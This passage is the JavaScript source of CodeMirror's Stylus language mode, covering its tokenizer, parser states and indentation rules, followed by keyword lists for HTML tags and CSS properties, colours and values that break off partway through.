// CodeMirror, copyright (c) by Marijn Haverbeke and others
// Distributed under an MIT license: https://codemirror.net/LICENSE

// Stylus mode created by Dmitry Kiselyov http://git.io/AaRB

(function(mod) {
  if (typeof exports == "object" && typeof module == "object") // CommonJS
    mod(require("../../lib/codemirror"));
  else if (typeof define == "function" && define.amd) // AMD
    define(["../../lib/codemirror"], mod);
  else // Plain browser env
    mod(CodeMirror);
})(function(CodeMirror) {
  "use strict";

  CodeMirror.defineMode("stylus", function(config) {
    var indentUnit = config.indentUnit,
        indentUnitString = '',
        tagKeywords = keySet(tagKeywords_),
        tagVariablesRegexp = /^(a|b|i|s|col|em)$/i,
        propertyKeywords = keySet(propertyKeywords_),
        nonStandardPropertyKeywords = keySet(nonStandardPropertyKeywords_),
        valueKeywords = keySet(valueKeywords_),
        colorKeywords = keySet(colorKeywords_),
        documentTypes = keySet(documentTypes_),
        documentTypesRegexp = wordRegexp(documentTypes_),
        mediaFeatures = keySet(mediaFeatures_),
        mediaTypes = keySet(mediaTypes_),
        fontProperties = keySet(fontProperties_),
        operatorsRegexp = /^\s*([.]{2,3}|&&|\|\||\*\*|[?!=:]?=|[-+*\/%<>]=?|\?:|\~)/,
        wordOperatorKeywordsRegexp = wordRegexp(wordOperatorKeywords_),
        blockKeywords = keySet(blockKeywords_),
        vendorPrefixesRegexp = new RegExp(/^\-(moz|ms|o|webkit)-/i),
        commonAtoms = keySet(commonAtoms_),
        firstWordMatch = "",
        states = {},
        ch,
        style,
        type,
        override;

    while (indentUnitString.length < indentUnit) indentUnitString += ' ';

    /**
     * Tokenizers
     */
    function tokenBase(stream, state) {
      firstWordMatch = stream.string.match(/(^[\w-]+\s*=\s*$)|(^\s*[\w-]+\s*=\s*[\w-])|(^\s*(\.|#|@|\$|\&|\[|\d|\+|::?|\{|\>|~|\/)?\s*[\w-]*([a-z0-9-]|\*|\/\*)(\(|,)?)/);
      state.context.line.firstWord = firstWordMatch ? firstWordMatch[0].replace(/^\s*/, "") : "";
      state.context.line.indent = stream.indentation();
      ch = stream.peek();

      // Line comment
      if (stream.match("//")) {
        stream.skipToEnd();
        return ["comment", "comment"];
      }
      // Block comment
      if (stream.match("/*")) {
        state.tokenize = tokenCComment;
        return tokenCComment(stream, state);
      }
      // String
      if (ch == "\"" || ch == "'") {
        stream.next();
        state.tokenize = tokenString(ch);
        return state.tokenize(stream, state);
      }
      // Def
      if (ch == "@") {
        stream.next();
        stream.eatWhile(/[\w\\-]/);
        return ["def", stream.current()];
      }
      // ID selector or Hex color
      if (ch == "#") {
        stream.next();
        // Hex color
        if (stream.match(/^[0-9a-f]{3}([0-9a-f]([0-9a-f]{2}){0,2})?\b(?!-)/i)) {
          return ["atom", "atom"];
        }
        // ID selector
        if (stream.match(/^[a-z][\w-]*/i)) {
          return ["builtin", "hash"];
        }
      }
      // Vendor prefixes
      if (stream.match(vendorPrefixesRegexp)) {
        return ["meta", "vendor-prefixes"];
      }
      // Numbers
      if (stream.match(/^-?[0-9]?\.?[0-9]/)) {
        stream.eatWhile(/[a-z%]/i);
        return ["number", "unit"];
      }
      // !important|optional
      if (ch == "!") {
        stream.next();
        return [stream.match(/^(important|optional)/i) ? "keyword": "operator", "important"];
      }
      // Class
      if (ch == "." && stream.match(/^\.[a-z][\w-]*/i)) {
        return ["qualifier", "qualifier"];
      }
      // url url-prefix domain regexp
      if (stream.match(documentTypesRegexp)) {
        if (stream.peek() == "(") state.tokenize = tokenParenthesized;
        return ["property", "word"];
      }
      // Mixins / Functions
      if (stream.match(/^[a-z][\w-]*\(/i)) {
        stream.backUp(1);
        return ["keyword", "mixin"];
      }
      // Block mixins
      if (stream.match(/^(\+|-)[a-z][\w-]*\(/i)) {
        stream.backUp(1);
        return ["keyword", "block-mixin"];
      }
      // Parent Reference BEM naming
      if (stream.string.match(/^\s*&/) && stream.match(/^[-_]+[a-z][\w-]*/)) {
        return ["qualifier", "qualifier"];
      }
      // / Root Reference & Parent Reference
      if (stream.match(/^(\/|&)(-|_|:|\.|#|[a-z])/)) {
        stream.backUp(1);
        return ["variable-3", "reference"];
      }
      if (stream.match(/^&{1}\s*$/)) {
        return ["variable-3", "reference"];
      }
      // Word operator
      if (stream.match(wordOperatorKeywordsRegexp)) {
        return ["operator", "operator"];
      }
      // Word
      if (stream.match(/^\$?[-_]*[a-z0-9]+[\w-]*/i)) {
        // Variable
        if (stream.match(/^(\.|\[)[\w-\'\"\]]+/i, false)) {
          if (!wordIsTag(stream.current())) {
            stream.match('.');
            return ["variable-2", "variable-name"];
          }
        }
        return ["variable-2", "word"];
      }
      // Operators
      if (stream.match(operatorsRegexp)) {
        return ["operator", stream.current()];
      }
      // Delimiters
      if (/[:;,{}\[\]\(\)]/.test(ch)) {
        stream.next();
        return [null, ch];
      }
      // Non-detected items
      stream.next();
      return [null, null];
    }

    /**
     * Token comment
     */
    function tokenCComment(stream, state) {
      var maybeEnd = false, ch;
      while ((ch = stream.next()) != null) {
        if (maybeEnd && ch == "/") {
          state.tokenize = null;
          break;
        }
        maybeEnd = (ch == "*");
      }
      return ["comment", "comment"];
    }

    /**
     * Token string
     */
    function tokenString(quote) {
      return function(stream, state) {
        var escaped = false, ch;
        while ((ch = stream.next()) != null) {
          if (ch == quote && !escaped) {
            if (quote == ")") stream.backUp(1);
            break;
          }
          escaped = !escaped && ch == "\\";
        }
        if (ch == quote || !escaped && quote != ")") state.tokenize = null;
        return ["string", "string"];
      };
    }

    /**
     * Token parenthesized
     */
    function tokenParenthesized(stream, state) {
      stream.next(); // Must be "("
      if (!stream.match(/\s*[\"\')]/, false))
        state.tokenize = tokenString(")");
      else
        state.tokenize = null;
      return [null, "("];
    }

    /**
     * Context management
     */
    function Context(type, indent, prev, line) {
      this.type = type;
      this.indent = indent;
      this.prev = prev;
      this.line = line || {firstWord: "", indent: 0};
    }

    function pushContext(state, stream, type, indent) {
      indent = indent >= 0 ? indent : indentUnit;
      state.context = new Context(type, stream.indentation() + indent, state.context);
      return type;
    }

    function popContext(state, currentIndent) {
      var contextIndent = state.context.indent - indentUnit;
      currentIndent = currentIndent || false;
      state.context = state.context.prev;
      if (currentIndent) state.context.indent = contextIndent;
      return state.context.type;
    }

    function pass(type, stream, state) {
      return states[state.context.type](type, stream, state);
    }

    function popAndPass(type, stream, state, n) {
      for (var i = n || 1; i > 0; i--)
        state.context = state.context.prev;
      return pass(type, stream, state);
    }


    /**
     * Parser
     */
    function wordIsTag(word) {
      return word.toLowerCase() in tagKeywords;
    }

    function wordIsProperty(word) {
      word = word.toLowerCase();
      return word in propertyKeywords || word in fontProperties;
    }

    function wordIsBlock(word) {
      return word.toLowerCase() in blockKeywords;
    }

    function wordIsVendorPrefix(word) {
      return word.toLowerCase().match(vendorPrefixesRegexp);
    }

    function wordAsValue(word) {
      var wordLC = word.toLowerCase();
      var override = "variable-2";
      if (wordIsTag(word)) override = "tag";
      else if (wordIsBlock(word)) override = "block-keyword";
      else if (wordIsProperty(word)) override = "property";
      else if (wordLC in valueKeywords || wordLC in commonAtoms) override = "atom";
      else if (wordLC == "return" || wordLC in colorKeywords) override = "keyword";

      // Font family
      else if (word.match(/^[A-Z]/)) override = "string";
      return override;
    }

    function typeIsBlock(type, stream) {
      return ((endOfLine(stream) && (type == "{" || type == "]" || type == "hash" || type == "qualifier")) || type == "block-mixin");
    }

    function typeIsInterpolation(type, stream) {
      return type == "{" && stream.match(/^\s*\$?[\w-]+/i, false);
    }

    function typeIsPseudo(type, stream) {
      return type == ":" && stream.match(/^[a-z-]+/, false);
    }

    function startOfLine(stream) {
      return stream.sol() || stream.string.match(new RegExp("^\\s*" + escapeRegExp(stream.current())));
    }

    function endOfLine(stream) {
      return stream.eol() || stream.match(/^\s*$/, false);
    }

    function firstWordOfLine(line) {
      var re = /^\s*[-_]*[a-z0-9]+[\w-]*/i;
      var result = typeof line == "string" ? line.match(re) : line.string.match(re);
      return result ? result[0].replace(/^\s*/, "") : "";
    }


    /**
     * Block
     */
    states.block = function(type, stream, state) {
      if ((type == "comment" && startOfLine(stream)) ||
          (type == "," && endOfLine(stream)) ||
          type == "mixin") {
        return pushContext(state, stream, "block", 0);
      }
      if (typeIsInterpolation(type, stream)) {
        return pushContext(state, stream, "interpolation");
      }
      if (endOfLine(stream) && type == "]") {
        if (!/^\s*(\.|#|:|\[|\*|&)/.test(stream.string) && !wordIsTag(firstWordOfLine(stream))) {
          return pushContext(state, stream, "block", 0);
        }
      }
      if (typeIsBlock(type, stream)) {
        return pushContext(state, stream, "block");
      }
      if (type == "}" && endOfLine(stream)) {
        return pushContext(state, stream, "block", 0);
      }
      if (type == "variable-name") {
        if (stream.string.match(/^\s?\$[\w-\.\[\]\'\"]+$/) || wordIsBlock(firstWordOfLine(stream))) {
          return pushContext(state, stream, "variableName");
        }
        else {
          return pushContext(state, stream, "variableName", 0);
        }
      }
      if (type == "=") {
        if (!endOfLine(stream) && !wordIsBlock(firstWordOfLine(stream))) {
          return pushContext(state, stream, "block", 0);
        }
        return pushContext(state, stream, "block");
      }
      if (type == "*") {
        if (endOfLine(stream) || stream.match(/\s*(,|\.|#|\[|:|{)/,false)) {
          override = "tag";
          return pushContext(state, stream, "block");
        }
      }
      if (typeIsPseudo(type, stream)) {
        return pushContext(state, stream, "pseudo");
      }
      if (/@(font-face|media|supports|(-moz-)?document)/.test(type)) {
        return pushContext(state, stream, endOfLine(stream) ? "block" : "atBlock");
      }
      if (/@(-(moz|ms|o|webkit)-)?keyframes$/.test(type)) {
        return pushContext(state, stream, "keyframes");
      }
      if (/@extends?/.test(type)) {
        return pushContext(state, stream, "extend", 0);
      }
      if (type && type.charAt(0) == "@") {

        // Property Lookup
        if (stream.indentation() > 0 && wordIsProperty(stream.current().slice(1))) {
          override = "variable-2";
          return "block";
        }
        if (/(@import|@require|@charset)/.test(type)) {
          return pushContext(state, stream, "block", 0);
        }
        return pushContext(state, stream, "block");
      }
      if (type == "reference" && endOfLine(stream)) {
        return pushContext(state, stream, "block");
      }
      if (type == "(") {
        return pushContext(state, stream, "parens");
      }

      if (type == "vendor-prefixes") {
        return pushContext(state, stream, "vendorPrefixes");
      }
      if (type == "word") {
        var word = stream.current();
        override = wordAsValue(word);

        if (override == "property") {
          if (startOfLine(stream)) {
            return pushContext(state, stream, "block", 0);
          } else {
            override = "atom";
            return "block";
          }
        }

        if (override == "tag") {

          // tag is a css value
          if (/embed|menu|pre|progress|sub|table/.test(word)) {
            if (wordIsProperty(firstWordOfLine(stream))) {
              override = "atom";
              return "block";
            }
          }

          // tag is an attribute
          if (stream.string.match(new RegExp("\\[\\s*" + word + "|" + word +"\\s*\\]"))) {
            override = "atom";
            return "block";
          }

          // tag is a variable
          if (tagVariablesRegexp.test(word)) {
            if ((startOfLine(stream) && stream.string.match(/=/)) ||
                (!startOfLine(stream) &&
                 !stream.string.match(/^(\s*\.|#|\&|\[|\/|>|\*)/) &&
                 !wordIsTag(firstWordOfLine(stream)))) {
              override = "variable-2";
              if (wordIsBlock(firstWordOfLine(stream)))  return "block";
              return pushContext(state, stream, "block", 0);
            }
          }

          if (endOfLine(stream)) return pushContext(state, stream, "block");
        }
        if (override == "block-keyword") {
          override = "keyword";

          // Postfix conditionals
          if (stream.current(/(if|unless)/) && !startOfLine(stream)) {
            return "block";
          }
          return pushContext(state, stream, "block");
        }
        if (word == "return") return pushContext(state, stream, "block", 0);

        // Placeholder selector
        if (override == "variable-2" && stream.string.match(/^\s?\$[\w-\.\[\]\'\"]+$/)) {
          return pushContext(state, stream, "block");
        }
      }
      return state.context.type;
    };


    /**
     * Parens
     */
    states.parens = function(type, stream, state) {
      if (type == "(") return pushContext(state, stream, "parens");
      if (type == ")") {
        if (state.context.prev.type == "parens") {
          return popContext(state);
        }
        if ((stream.string.match(/^[a-z][\w-]*\(/i) && endOfLine(stream)) ||
            wordIsBlock(firstWordOfLine(stream)) ||
            /(\.|#|:|\[|\*|&|>|~|\+|\/)/.test(firstWordOfLine(stream)) ||
            (!stream.string.match(/^-?[a-z][\w-\.\[\]\'\"]*\s*=/) &&
             wordIsTag(firstWordOfLine(stream)))) {
          return pushContext(state, stream, "block");
        }
        if (stream.string.match(/^[\$-]?[a-z][\w-\.\[\]\'\"]*\s*=/) ||
            stream.string.match(/^\s*(\(|\)|[0-9])/) ||
            stream.string.match(/^\s+[a-z][\w-]*\(/i) ||
            stream.string.match(/^\s+[\$-]?[a-z]/i)) {
          return pushContext(state, stream, "block", 0);
        }
        if (endOfLine(stream)) return pushContext(state, stream, "block");
        else return pushContext(state, stream, "block", 0);
      }
      if (type && type.charAt(0) == "@" && wordIsProperty(stream.current().slice(1))) {
        override = "variable-2";
      }
      if (type == "word") {
        var word = stream.current();
        override = wordAsValue(word);
        if (override == "tag" && tagVariablesRegexp.test(word)) {
          override = "variable-2";
        }
        if (override == "property" || word == "to") override = "atom";
      }
      if (type == "variable-name") {
        return pushContext(state, stream, "variableName");
      }
      if (typeIsPseudo(type, stream)) {
        return pushContext(state, stream, "pseudo");
      }
      return state.context.type;
    };


    /**
     * Vendor prefixes
     */
    states.vendorPrefixes = function(type, stream, state) {
      if (type == "word") {
        override = "property";
        return pushContext(state, stream, "block", 0);
      }
      return popContext(state);
    };


    /**
     * Pseudo
     */
    states.pseudo = function(type, stream, state) {
      if (!wordIsProperty(firstWordOfLine(stream.string))) {
        stream.match(/^[a-z-]+/);
        override = "variable-3";
        if (endOfLine(stream)) return pushContext(state, stream, "block");
        return popContext(state);
      }
      return popAndPass(type, stream, state);
    };


    /**
     * atBlock
     */
    states.atBlock = function(type, stream, state) {
      if (type == "(") return pushContext(state, stream, "atBlock_parens");
      if (typeIsBlock(type, stream)) {
        return pushContext(state, stream, "block");
      }
      if (typeIsInterpolation(type, stream)) {
        return pushContext(state, stream, "interpolation");
      }
      if (type == "word") {
        var word = stream.current().toLowerCase();
        if (/^(only|not|and|or)$/.test(word))
          override = "keyword";
        else if (documentTypes.hasOwnProperty(word))
          override = "tag";
        else if (mediaTypes.hasOwnProperty(word))
          override = "attribute";
        else if (mediaFeatures.hasOwnProperty(word))
          override = "property";
        else if (nonStandardPropertyKeywords.hasOwnProperty(word))
          override = "string-2";
        else override = wordAsValue(stream.current());
        if (override == "tag" && endOfLine(stream)) {
          return pushContext(state, stream, "block");
        }
      }
      if (type == "operator" && /^(not|and|or)$/.test(stream.current())) {
        override = "keyword";
      }
      return state.context.type;
    };

    states.atBlock_parens = function(type, stream, state) {
      if (type == "{" || type == "}") return state.context.type;
      if (type == ")") {
        if (endOfLine(stream)) return pushContext(state, stream, "block");
        else return pushContext(state, stream, "atBlock");
      }
      if (type == "word") {
        var word = stream.current().toLowerCase();
        override = wordAsValue(word);
        if (/^(max|min)/.test(word)) override = "property";
        if (override == "tag") {
          tagVariablesRegexp.test(word) ? override = "variable-2" : override = "atom";
        }
        return state.context.type;
      }
      return states.atBlock(type, stream, state);
    };


    /**
     * Keyframes
     */
    states.keyframes = function(type, stream, state) {
      if (stream.indentation() == "0" && ((type == "}" && startOfLine(stream)) || type == "]" || type == "hash"
                                          || type == "qualifier" || wordIsTag(stream.current()))) {
        return popAndPass(type, stream, state);
      }
      if (type == "{") return pushContext(state, stream, "keyframes");
      if (type == "}") {
        if (startOfLine(stream)) return popContext(state, true);
        else return pushContext(state, stream, "keyframes");
      }
      if (type == "unit" && /^[0-9]+\%$/.test(stream.current())) {
        return pushContext(state, stream, "keyframes");
      }
      if (type == "word") {
        override = wordAsValue(stream.current());
        if (override == "block-keyword") {
          override = "keyword";
          return pushContext(state, stream, "keyframes");
        }
      }
      if (/@(font-face|media|supports|(-moz-)?document)/.test(type)) {
        return pushContext(state, stream, endOfLine(stream) ? "block" : "atBlock");
      }
      if (type == "mixin") {
        return pushContext(state, stream, "block", 0);
      }
      return state.context.type;
    };


    /**
     * Interpolation
     */
    states.interpolation = function(type, stream, state) {
      if (type == "{") popContext(state) && pushContext(state, stream, "block");
      if (type == "}") {
        if (stream.string.match(/^\s*(\.|#|:|\[|\*|&|>|~|\+|\/)/i) ||
            (stream.string.match(/^\s*[a-z]/i) && wordIsTag(firstWordOfLine(stream)))) {
          return pushContext(state, stream, "block");
        }
        if (!stream.string.match(/^(\{|\s*\&)/) ||
            stream.match(/\s*[\w-]/,false)) {
          return pushContext(state, stream, "block", 0);
        }
        return pushContext(state, stream, "block");
      }
      if (type == "variable-name") {
        return pushContext(state, stream, "variableName", 0);
      }
      if (type == "word") {
        override = wordAsValue(stream.current());
        if (override == "tag") override = "atom";
      }
      return state.context.type;
    };


    /**
     * Extend/s
     */
    states.extend = function(type, stream, state) {
      if (type == "[" || type == "=") return "extend";
      if (type == "]") return popContext(state);
      if (type == "word") {
        override = wordAsValue(stream.current());
        return "extend";
      }
      return popContext(state);
    };


    /**
     * Variable name
     */
    states.variableName = function(type, stream, state) {
      if (type == "string" || type == "[" || type == "]" || stream.current().match(/^(\.|\$)/)) {
        if (stream.current().match(/^\.[\w-]+/i)) override = "variable-2";
        return "variableName";
      }
      return popAndPass(type, stream, state);
    };


    return {
      startState: function(base) {
        return {
          tokenize: null,
          state: "block",
          context: new Context("block", base || 0, null)
        };
      },
      token: function(stream, state) {
        if (!state.tokenize && stream.eatSpace()) return null;
        style = (state.tokenize || tokenBase)(stream, state);
        if (style && typeof style == "object") {
          type = style[1];
          style = style[0];
        }
        override = style;
        state.state = states[state.state](type, stream, state);
        return override;
      },
      indent: function(state, textAfter, line) {

        var cx = state.context,
            ch = textAfter && textAfter.charAt(0),
            indent = cx.indent,
            lineFirstWord = firstWordOfLine(textAfter),
            lineIndent = line.match(/^\s*/)[0].replace(/\t/g, indentUnitString).length,
            prevLineFirstWord = state.context.prev ? state.context.prev.line.firstWord : "",
            prevLineIndent = state.context.prev ? state.context.prev.line.indent : lineIndent;

        if (cx.prev &&
            (ch == "}" && (cx.type == "block" || cx.type == "atBlock" || cx.type == "keyframes") ||
             ch == ")" && (cx.type == "parens" || cx.type == "atBlock_parens") ||
             ch == "{" && (cx.type == "at"))) {
          indent = cx.indent - indentUnit;
        } else if (!(/(\})/.test(ch))) {
          if (/@|\$|\d/.test(ch) ||
              /^\{/.test(textAfter) ||
/^\s*\/(\/|\*)/.test(textAfter) ||
              /^\s*\/\*/.test(prevLineFirstWord) ||
              /^\s*[\w-\.\[\]\'\"]+\s*(\?|:|\+)?=/i.test(textAfter) ||
/^(\+|-)?[a-z][\w-]*\(/i.test(textAfter) ||
/^return/.test(textAfter) ||
              wordIsBlock(lineFirstWord)) {
            indent = lineIndent;
          } else if (/(\.|#|:|\[|\*|&|>|~|\+|\/)/.test(ch) || wordIsTag(lineFirstWord)) {
            if (/\,\s*$/.test(prevLineFirstWord)) {
              indent = prevLineIndent;
            } else if (/^\s+/.test(line) && (/(\.|#|:|\[|\*|&|>|~|\+|\/)/.test(prevLineFirstWord) || wordIsTag(prevLineFirstWord))) {
              indent = lineIndent <= prevLineIndent ? prevLineIndent : prevLineIndent + indentUnit;
            } else {
              indent = lineIndent;
            }
          } else if (!/,\s*$/.test(line) && (wordIsVendorPrefix(lineFirstWord) || wordIsProperty(lineFirstWord))) {
            if (wordIsBlock(prevLineFirstWord)) {
              indent = lineIndent <= prevLineIndent ? prevLineIndent : prevLineIndent + indentUnit;
            } else if (/^\{/.test(prevLineFirstWord)) {
              indent = lineIndent <= prevLineIndent ? lineIndent : prevLineIndent + indentUnit;
            } else if (wordIsVendorPrefix(prevLineFirstWord) || wordIsProperty(prevLineFirstWord)) {
              indent = lineIndent >= prevLineIndent ? prevLineIndent : lineIndent;
            } else if (/^(\.|#|:|\[|\*|&|@|\+|\-|>|~|\/)/.test(prevLineFirstWord) ||
                      /=\s*$/.test(prevLineFirstWord) ||
                      wordIsTag(prevLineFirstWord) ||
                      /^\$[\w-\.\[\]\'\"]/.test(prevLineFirstWord)) {
              indent = prevLineIndent + indentUnit;
            } else {
              indent = lineIndent;
            }
          }
        }
        return indent;
      },
      electricChars: "}",
      blockCommentStart: "/*",
      blockCommentEnd: "*/",
      blockCommentContinue: " * ",
      lineComment: "//",
      fold: "indent"
    };
  });

  // developer.mozilla.org/en-US/docs/Web/HTML/Element
  var tagKeywords_ = ["a","abbr","address","area","article","aside","audio", "b", "base","bdi", "bdo","bgsound","blockquote","body","br","button","canvas","caption","cite", "code","col","colgroup","data","datalist","dd","del","details","dfn","div", "dl","dt","em","embed","fieldset","figcaption","figure","footer","form","h1", "h2","h3","h4","h5","h6","head","header","hgroup","hr","html","i","iframe", "img","input","ins","kbd","keygen","label","legend","li","link","main","map", "mark","marquee","menu","menuitem","meta","meter","nav","nobr","noframes", "noscript","object","ol","optgroup","option","output","p","param","pre", "progress","q","rp","rt","ruby","s","samp","script","section","select", "small","source","span","strong","style","sub","summary","sup","table","tbody","td","textarea","tfoot","th","thead","time","tr","track", "u","ul","var","video"];

  // github.com/codemirror/CodeMirror/blob/master/mode/css/css.js
  // Note, "url-prefix" should precede "url" in order to match correctly in documentTypesRegexp
  var documentTypes_ = ["domain", "regexp", "url-prefix", "url"];
  var mediaTypes_ = ["all","aural","braille","handheld","print","projection","screen","tty","tv","embossed"];
  var mediaFeatures_ = ["width","min-width","max-width","height","min-height","max-height","device-width","min-device-width","max-device-width","device-height","min-device-height","max-device-height","aspect-ratio","min-aspect-ratio","max-aspect-ratio","device-aspect-ratio","min-device-aspect-ratio","max-device-aspect-ratio","color","min-color","max-color","color-index","min-color-index","max-color-index","monochrome","min-monochrome","max-monochrome","resolution","min-resolution","max-resolution","scan","grid","dynamic-range","video-dynamic-range"];
  var propertyKeywords_ = ["align-content","align-items","align-self","alignment-adjust","alignment-baseline","anchor-point","animation","animation-delay","animation-direction","animation-duration","animation-fill-mode","animation-iteration-count","animation-name","animation-play-state","animation-timing-function","appearance","azimuth","backface-visibility","background","background-attachment","background-clip","background-color","background-image","background-origin","background-position","background-repeat","background-size","baseline-shift","binding","bleed","bookmark-label","bookmark-level","bookmark-state","bookmark-target","border","border-bottom","border-bottom-color","border-bottom-left-radius","border-bottom-right-radius","border-bottom-style","border-bottom-width","border-collapse","border-color","border-image","border-image-outset","border-image-repeat","border-image-slice","border-image-source","border-image-width","border-left","border-left-color","border-left-style","border-left-width","border-radius","border-right","border-right-color","border-right-style","border-right-width","border-spacing","border-style","border-top","border-top-color","border-top-left-radius","border-top-right-radius","border-top-style","border-top-width","border-width","bottom","box-decoration-break","box-shadow","box-sizing","break-after","break-before","break-inside","caption-side","clear","clip","color","color-profile","column-count","column-fill","column-gap","column-rule","column-rule-color","column-rule-style","column-rule-width","column-span","column-width","columns","content","counter-increment","counter-reset","crop","cue","cue-after","cue-before","cursor","direction","display","dominant-baseline","drop-initial-after-adjust","drop-initial-after-align","drop-initial-before-adjust","drop-initial-before-align","drop-initial-size","drop-initial-value","elevation","empty-cells","fit","fit-position","flex","flex-basis","flex-direction","flex-flow","flex-grow","flex-shrink","flex-wrap","float","float-offset","flow-from","flow-into","font","font-feature-settings","font-family","font-kerning","font-language-override","font-size","font-size-adjust","font-stretch","font-style","font-synthesis","font-variant","font-variant-alternates","font-variant-caps","font-variant-east-asian","font-variant-ligatures","font-variant-numeric","font-variant-position","font-weight","grid","grid-area","grid-auto-columns","grid-auto-flow","grid-auto-position","grid-auto-rows","grid-column","grid-column-end","grid-column-start","grid-row","grid-row-end","grid-row-start","grid-template","grid-template-areas","grid-template-columns","grid-template-rows","hanging-punctuation","height","hyphens","icon","image-orientation","image-rendering","image-resolution","inline-box-align","justify-content","left","letter-spacing","line-break","line-height","line-stacking","line-stacking-ruby","line-stacking-shift","line-stacking-strategy","list-style","list-style-image","list-style-position","list-style-type","margin","margin-bottom","margin-left","margin-right","margin-top","marker-offset","marks","marquee-direction","marquee-loop","marquee-play-count","marquee-speed","marquee-style","max-height","max-width","min-height","min-width","move-to","nav-down","nav-index","nav-left","nav-right","nav-up","object-fit","object-position","opacity","order","orphans","outline","outline-color","outline-offset","outline-style","outline-width","overflow","overflow-style","overflow-wrap","overflow-x","overflow-y","padding","padding-bottom","padding-left","padding-right","padding-top","page","page-break-after","page-break-before","page-break-inside","page-policy","pause","pause-after","pause-before","perspective","perspective-origin","pitch","pitch-range","play-during","position","presentation-level","punctuation-trim","quotes","region-break-after","region-break-before","region-break-inside","region-fragment","rendering-intent","resize","rest","rest-after","rest-before","richness","right","rotation","rotation-point","ruby-align","ruby-overhang","ruby-position","ruby-span","shape-image-threshold","shape-inside","shape-margin","shape-outside","size","speak","speak-as","speak-header","speak-numeral","speak-punctuation","speech-rate","stress","string-set","tab-size","table-layout","target","target-name","target-new","target-position","text-align","text-align-last","text-decoration","text-decoration-color","text-decoration-line","text-decoration-skip","text-decoration-style","text-emphasis","text-emphasis-color","text-emphasis-position","text-emphasis-style","text-height","text-indent","text-justify","text-outline","text-overflow","text-shadow","text-size-adjust","text-space-collapse","text-transform","text-underline-position","text-wrap","top","transform","transform-origin","transform-style","transition","transition-delay","transition-duration","transition-property","transition-timing-function","unicode-bidi","vertical-align","visibility","voice-balance","voice-duration","voice-family","voice-pitch","voice-range","voice-rate","voice-stress","voice-volume","volume","white-space","widows","width","will-change","word-break","word-spacing","word-wrap","z-index","clip-path","clip-rule","mask","enable-background","filter","flood-color","flood-opacity","lighting-color","stop-color","stop-opacity","pointer-events","color-interpolation","color-interpolation-filters","color-rendering","fill","fill-opacity","fill-rule","image-rendering","marker","marker-end","marker-mid","marker-start","shape-rendering","stroke","stroke-dasharray","stroke-dashoffset","stroke-linecap","stroke-linejoin","stroke-miterlimit","stroke-opacity","stroke-width","text-rendering","baseline-shift","dominant-baseline","glyph-orientation-horizontal","glyph-orientation-vertical","text-anchor","writing-mode","font-smoothing","osx-font-smoothing"];
  var nonStandardPropertyKeywords_ = ["scrollbar-arrow-color","scrollbar-base-color","scrollbar-dark-shadow-color","scrollbar-face-color","scrollbar-highlight-color","scrollbar-shadow-color","scrollbar-3d-light-color","scrollbar-track-color","shape-inside","searchfield-cancel-button","searchfield-decoration","searchfield-results-button","searchfield-results-decoration","zoom"];
  var fontProperties_ = ["font-family","src","unicode-range","font-variant","font-feature-settings","font-stretch","font-weight","font-style"];
  var colorKeywords_ = ["aliceblue","antiquewhite","aqua","aquamarine","azure","beige","bisque","black","blanchedalmond","blue","blueviolet","brown","burlywood","cadetblue","chartreuse","chocolate","coral","cornflowerblue","cornsilk","crimson","cyan","darkblue","darkcyan","darkgoldenrod","darkgray","darkgreen","darkkhaki","darkmagenta","darkolivegreen","darkorange","darkorchid","darkred","darksalmon","darkseagreen","darkslateblue","darkslategray","darkturquoise","darkviolet","deeppink","deepskyblue","dimgray","dodgerblue","firebrick","floralwhite","forestgreen","fuchsia","gainsboro","ghostwhite","gold","goldenrod","gray","grey","green","greenyellow","honeydew","hotpink","indianred","indigo","ivory","khaki","lavender","lavenderblush","lawngreen","lemonchiffon","lightblue","lightcoral","lightcyan","lightgoldenrodyellow","lightgray","lightgreen","lightpink","lightsalmon","lightseagreen","lightskyblue","lightslategray","lightsteelblue","lightyellow","lime","limegreen","linen","magenta","maroon","mediumaquamarine","mediumblue","mediumorchid","mediumpurple","mediumseagreen","mediumslateblue","mediumspringgreen","mediumturquoise","mediumvioletred","midnightblue","mintcream","mistyrose","moccasin","navajowhite","navy","oldlace","olive","olivedrab","orange","orangered","orchid","palegoldenrod","palegreen","paleturquoise","palevioletred","papayawhip","peachpuff","peru","pink","plum","powderblue","purple","rebeccapurple","red","rosybrown","royalblue","saddlebrown","salmon","sandybrown","seagreen","seashell","sienna","silver","skyblue","slateblue","slategray","snow","springgreen","steelblue","tan","teal","thistle","tomato","turquoise","violet","wheat","white","whitesmoke","yellow","yellowgreen"];
  var valueKeywords_ = ["above","absolute","activeborder","additive","activecaption","afar","after-white-space","ahead","alias","all","all-scroll","alphabetic","alternate","always","amharic","amharic-abegede","antialiased","appworkspace","arabic-indic","armenian","asterisks","attr","auto","avoid","avoid-column","avoid-page","avoid-region","background","backwards","baseline","below","bidi-override","binary","bengali","blink","block","block-axis","bold","bolder","border","border-box","both","bottom","break","break-all","break-word","bullets","button","button-bevel","buttonface","buttonhighlight","buttonshadow","buttontext","calc","cambodian","capitalize","caps-lock-indicator","caption","captiontext","caret","cell","center","checkbox","circle","cjk-decimal","cjk-earthly-branch","cjk-heavenly-stem","cjk-ideographic","clear","clip","close-quote","col-resize","collapse","column","compact","condensed","conic-gradient","contain","content","contents","content-box","context-menu","continuous","copy","counter","counters","cover","crop","cross","crosshair","currentcolor","cursive","cyclic","dashed","decimal","decimal-leading-zero","default","default-button","destination-atop","destination-in","destination-out","destination-over","devanagari","disc","discard","disclosure-closed","disclosure-open","document","dot-dash","dot-dot-dash","dotted","double","down","e-resize","ease","ease-in","ease-in-out","ease-out","element","ellipse","ellipsis","embed","end","ethiopic","ethiopic-abegede","ethiopic-abegede-am-et","ethiopic-abegede-gez","ethiopic-abegede-ti-er","ethiopic-abegede-ti-et","ethiopic-halehame-aa-er","ethiopic-halehame-aa-et","ethiopic-halehame-am-et","ethiopic-halehame-gez","ethiopic-halehame-om-et","ethiopic-halehame-sid-et","ethiopic-halehame-so-et","ethiopic-halehame-ti-er","ethiopic-halehame-ti-et","ethiopic-halehame-tig","ethiopic-numeric","ew-resize","expanded","extends","extra-condensed","extra-expanded","fantasy","fast","fill","fixed","flat","flex","footnotes","forwards","from","geometricPrecision","georgian","graytext","groove","gujarati","gurmukhi","hand","hangul","hangul-consonant","hebrew","help","hidden","hide","high","higher","highlight","highlighttext","hiragana","hiragana-iroha","horizontal","hsl","hsla","icon","ignore","inactiveborder","inactivecaption","inactivecaptiontext","infinite","infobackground","infotext","inherit","initial","inline","inline-axis","inline-block","inline-flex","inline-table","inset","inside","intrinsic","invert","italic","japanese-formal","japanes